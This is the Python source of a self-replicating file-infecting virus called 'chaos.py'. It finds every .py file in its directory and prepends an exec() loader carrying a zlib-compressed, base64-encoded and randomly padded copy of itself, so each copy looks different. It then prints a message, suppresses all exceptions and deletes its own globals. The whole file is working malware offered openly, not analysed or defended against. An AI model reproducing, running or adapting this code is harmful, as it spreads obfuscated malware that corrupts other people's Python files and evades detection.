  1# ################
  2# chaos.py
  3# a Python virus
  4# ###############
  5
  6# begin-78ea1850f48d1c1802f388db81698fd0
  7
  8import base64
  9import glob
 10import hashlib
 11import inspect
 12import os
 13import random
 14import zlib
 15
 16def get_content_of_file(file):
 17  data = None
 18    # return the content of a file
 19  with open(file, "r") as my_file:
 20    data = my_file.readlines()
 21
 22  return data
 23  
 24def get_content_if_infectable(file, hash):
 25    # return the content of a file only if it hasn't been infected yet
 26  data = get_content_of_file(file)
 27
 28  for line in data:
 29    if hash in line:
 30      return None
 31
 32  return data
 33
 34def obscure(data: bytes) -> bytes:
 35    # obscure a stream of bytes compressing it and encoding it in base64
 36    return base64.urlsafe_b64encode(zlib.compress(data, 9))
 37
 38def transform_and_obscure_virus_code(virus_code):
 39    # transforms the virus code adding some randomic contents, compressing it and converting it in base64
 40  new_virus_code = []
 41  for line in virus_code:
 42    new_virus_code.append("# "+ str(random.randrange(1000000))+ "\n")
 43    new_virus_code.append(line + "\n")
 44
 45  obscured_virus_code = obscure(bytes("".join(new_virus_code), 'utf-8'))
 46  return obscured_virus_code
 47
 48def find_files_to_infect(directory = "."):
 49  # find other files that can potentially be infected 
 50  return [file for file in glob.glob("*.py")]
 51
 52def summon_chaos():
 53  # the virus payload
 54  print("We are sick, fucked up and complicated\nWe are chaos, we can't be cured")
 55
 56def infect(file, virus_code):
 57  # infect a single file. The routine open the file and if it's not been infected yet, infect the file with a custom version of the virus code
 58  hash = hashlib.md5(file.encode("utf-8")).hexdigest()
 59
 60  if (data:=get_content_if_infectable(file, hash)):
 61    obscured_virus_code = transform_and_obscure_virus_code(virus_code)
 62    viral_vector = "exec(\"import zlib\\nimport base64\\nexec(zlib.decompress(base64.urlsafe_b64decode("+str(obscured_virus_code)+")))\")"
 63
 64    with open(file, "w") as infected_file:
 65      infected_file.write("\n# begin-"+ hash + "\n" + viral_vector + "\n# end-" + hash + "\n")
 66      infected_file.writelines(data)
 67
 68def get_virus_code():
 69  # open the current file and returns the virus code, that is the code between the
 70  # begin-{hash} and the end-{hash} tags
 71  virus_code_on = False
 72  virus_code = []
 73
 74  virus_hash = hashlib.md5(os.path.basename(__file__).encode("utf-8")).hexdigest()
 75  code = get_content_of_file(__file__)
 76
 77  for line in code:
 78    if "# begin-" + virus_hash in line:
 79      virus_code_on = True
 80
 81    if virus_code_on:
 82      virus_code.append(line + "\n")
 83
 84    if "# end-" + virus_hash in line:
 85      virus_code_on = False
 86      break
 87
 88  return virus_code
 89
 90# entry point
 91
 92try:
 93  # retrieve the virus code from the current infected script
 94  virus_code = get_virus_code()
 95
 96  # look for other files to infect
 97  for file in find_files_to_infect():
 98    infect(file, virus_code)
 99
100  # call the payload
101  summon_chaos()
102
103except:
104  pass
105
106finally:
107  # delete used names from memory
108  for i in list(globals().keys()):
109      if(i[0] != '_'):
110          exec('del {}'.format(i))
111
112  del i
113
114# end-78ea1850f48d1c1802f388db81698fd0
